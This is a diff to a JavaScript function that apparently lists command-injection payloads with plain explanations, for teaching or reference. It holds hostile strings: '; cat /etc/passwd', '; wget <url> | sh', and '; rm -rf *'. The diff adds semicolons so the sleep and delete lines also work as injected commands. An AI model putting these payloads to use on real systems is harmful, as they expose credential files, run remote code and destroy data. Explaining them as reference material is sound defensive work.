@@ -32,8 +32,8 @@ function CommandInjection(){
             {command:"; cat /etc/passwd", explanation:"Print out the contents of the passwd file on linux containing sensitive user information."},
             {command:"; ps aux", explanation:"Print out information on the current processes running on the machine."},
             {command:"; wget <url> | sh", explanation:"Download a script from a url and execute it using sh, does not have to be a shell script if other programming languages installed."},
-            {command:"sleep <Secs>s <Mins>m <Hours>h <Days>d", explanation:"Will cause the server to pause for a certain period of time."},
-            {command:"rm -rf *", explanation:"Remove all folders and subfolders from current directory."}
+            {command:"; sleep <Secs>s <Mins>m <Hours>h <Days>d", explanation:"Will cause the server to pause for a certain period of time."},
+            {command:"; rm -rf *", explanation:"Remove all folders and subfolders from current directory."}
         ]
     } 
 
